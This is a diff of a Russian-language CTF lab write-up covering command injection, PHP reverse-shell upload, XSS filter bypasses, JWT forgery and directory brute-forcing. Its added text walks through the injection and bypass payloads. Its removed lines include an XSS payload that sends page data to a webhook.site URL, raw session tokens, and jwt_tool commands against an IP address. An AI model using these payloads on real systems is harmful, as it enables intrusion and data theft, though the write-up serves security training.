@@ -1,11 +1,11 @@
 Задание CE: уровень 0
 
 
-
+перехватываем запрос через Burp Suit, уязвимость Command Execution позволяет выполнять команды через поле ввода.
 ![image](https://github.com/user-attachments/assets/32f708a3-3ace-4ce1-937f-488f765ebc2c)
 
 
-
+Командой ls -a (в URL кодировке пробел заменяется знаком +) ls+-a выводим содержимое директории, в том числе скрытые файлы. Видим директорию interesting, заходим в нее командой cd+interesting. Для выполнения команд последовательно, одним запросом используем ; . Выводим ее содержимое ls+-a. Видим файл creds.txt, выводим его командой cat+creds.txt
 ![image](https://github.com/user-attachments/assets/751c2241-b4b1-4920-a1da-f6ab80363c19)
 
 
@@ -14,6 +14,7 @@
 
 
 ![image](https://github.com/user-attachments/assets/b36c8816-b801-4863-82db-aa8e5940411e)
+В поле Cookie видим параметр secret, его значение закодировано в формате Base64, его можно раскодировать выделив его в Burp Suite или через команду показанную ниже.
 
 ![image](https://github.com/user-attachments/assets/8197605c-2165-4646-a0d8-27c1865e0d14)
 
@@ -27,14 +28,15 @@
 
 Задание FU: уровень 0
 
+![image](https://github.com/user-attachments/assets/304952ad-43a5-4ff8-83f7-3b82c8a6248d)
 
 
-![image](https://github.com/user-attachments/assets/9c4f8d0f-572a-4397-8467-d04bdf917dd3
-
+Видим сайт, на который доступна загрузка файла. Загрузим reverse shell. Ограничений на расширение файла нет, поэтому используем .php.
 ![image](https://github.com/user-attachments/assets/87f3e36c-5994-4ce0-81c3-b427f223a4ae)
 
 
 ![image](https://github.com/user-attachments/assets/874509f7-f323-4f30-86e3-c6f90584ec54)
+Через него получаем удаленный доступ. Выведем содержимое текущей директории ls+-a. Ничего интересного. Пробуем подняться выше командой cd+.. и выводим содержимое. Видим файл some.txt, командой cat выводим его.
 
 ![image](https://github.com/user-attachments/assets/c653cfc3-2808-4542-9d8b-72afbdaf41c0)
 
@@ -51,14 +53,18 @@ Command Execution: уровень 1
 
 ![image](https://github.com/user-attachments/assets/b7ebee0b-3b24-41de-aa81-83540012771a)
 
+Замети папку .hidden, которая пригодится нам дальше. В целом задание аналогичное, только у нас 2 переменных. Выводим содержимое ls+-a, заходим в директорию comex1, там находим файл log1.txt, выводим. 
+
 ![image](https://github.com/user-attachments/assets/cfa68234-318c-41f3-8fb6-f60d2c0faaa2)
 
+Замечаем необычную строку, декодировав ее получаем флаг
 ![image](https://github.com/user-attachments/assets/4f956069-8a47-4900-8962-71ba8103f02d)
 
 
 
 Command Execution: уровень 2
 
+Присутствует некоторая обработка ввода, которую можно обойти, например, закодировав \n %0A
 
 ![image](https://github.com/user-attachments/assets/4f2182ee-3b58-4be8-8407-d5c353a10680)
 
@@ -108,10 +114,11 @@ Command Execution: уровень 4
  XSS: уровень 2
 
  
-<body onload=alert(document.cookie)>
+Вводим <body onload=alert(document.cookie)> обходя фильтр скрипт
 
  ![image](https://github.com/user-attachments/assets/14402f74-d56c-4beb-a4fe-097906b96645)
  
+Декодируем куки important_person
 
 ![image](https://github.com/user-attachments/assets/8d07cb68-9225-41d2-88f3-4d6e0c68bc02)
 
@@ -119,6 +126,7 @@ Command Execution: уровень 4
 
   XSS: уровень 3
 
+Вводим <SvG/oNloAd=alert(some_important_info.txt)>, обходя защиту от xss
 
 ![image](https://github.com/user-attachments/assets/9c05f94f-ec0c-4ca0-8581-892fb8a2a8c6)
 
@@ -138,7 +146,6 @@ Command Execution: уровень 4
 
 <SvG/oNloAd=alert(/w4piesy3nm/)>
 
-some_important_info
 
 <SvG/oNloAd=alert(some_important_info.txt)>
 
@@ -148,28 +155,14 @@ some_important_info
 ![image](https://github.com/user-attachments/assets/1db9e6f9-d01e-483d-92a3-c297622c1ce9)
 
 
-
-token_dare=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTE5MDksInVzZXIiOiJkYXJlIiwiZ3JvdXAiOiJpbXBvcnRhbnQifQ.75cUIE6jIrCI6azJKX-fuY7LHRzxRlw15wLgyT00qnU; secret=MzB7WDU1X0MwMGsxM19Nb05TdDNyX30K; important_person_cookies=MzB7eHM1XzFkS193SDBfbjMzRF9pdH0K; token_dare=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTE5MDksInVzZXIiOiJkYXJlIiwiZ3JvdXAiOiJpbXBvcnRhbnQifQ.75cUIE6jIrCI6azJKX-fuY7LHRzxRlw15wLgyT00qnU
-
-
-
-<script>fetch('/some_important_info').then(r=>r.text()).then(d=>fetch('https://webhook.site/a5426673-ba98-48da-a6f5-e5dfe3d47c3f?flag='+d))</script>
-
-
-<SvG/oNloAdfetch('/some_important_info').then(r=>r.text()).then(d=>fetch('[https://your-server.com](https://webhook.site/a5426673-ba98-48da-a6f5-e5dfe3d47c3f)?flag='+d))>
-
-<script src="file:/var/www/html/csp-pentesting/malicious.js"></script>
-
-	https://webhook.site/a5426673-ba98-48da-a6f5-e5dfe3d47c3f
-
-python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test"
-
-python3 jwt_tool.py -t http://51.250.91.149/XSS/XSS_level3.php -rc "jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTE5MDksInVzZXIiOiJkYXJlIiwiZ3JvdXAiOiJpbXBvcnRhbnQifQ.75cUIE6jIrCI6azJKX-fuY7LHRzxRlw15wLgyT00qnU;anothercookie=test" -M pb-np
-
-
 ![image](https://github.com/user-attachments/assets/6def24d6-e4ef-431c-9ea4-770bf8c84be5)
 
 ![image](https://github.com/user-attachments/assets/8899d99c-af68-4706-9606-d505730989e4)
+
+Меняем поля на user и group, тем самым легко подделывая jwt токен, это возможно за счет отсутствия секретной строки, это можно проверить, введя случайные значения в это поле на сайте и если подпись все еще верифицирована, то этого слова нет.(подсказка)
+
+Подставляем новый токен и входим с куки админа
+
 
 ![image](https://github.com/user-attachments/assets/a9f8020a-6fd6-4069-89a4-71a248193b3c)
 
@@ -180,6 +173,7 @@ python3 jwt_tool.py -t http://51.250.91.149/XSS/XSS_level3.php -rc "jwt=eyJhbGci
   
   ![image](https://github.com/user-attachments/assets/53ae8c91-d57b-469e-a8db-58823efef263)
   
+Теперь записываем amazing_key в поле ключа
 
 ![image](https://github.com/user-attachments/assets/b975d289-b902-4242-a5c9-838c07e6d4a2)
 
@@ -208,6 +202,8 @@ python3 jwt_tool.py -t http://51.250.91.149/XSS/XSS_level3.php -rc "jwt=eyJhbGci
 File Inclusion: уровень 1
 
 ![image](https://github.com/user-attachments/assets/a06f1a4d-ad4a-46af-9102-9b81671add90)
+
+Дальше, применяя различные утилиты для поиска директорий  и файлов, например dirb, Ffuf, DirBuster начинаем искать. Я использовал DirBuster, тк он быстрее обрабатывал большие словами, которыми я пользовался сначала. Но, в этом задании, лучше составить свой словарь.
 
 ![image](https://github.com/user-attachments/assets/ba4d1474-f18e-4f04-bd5e-f8b59ea56199)
 
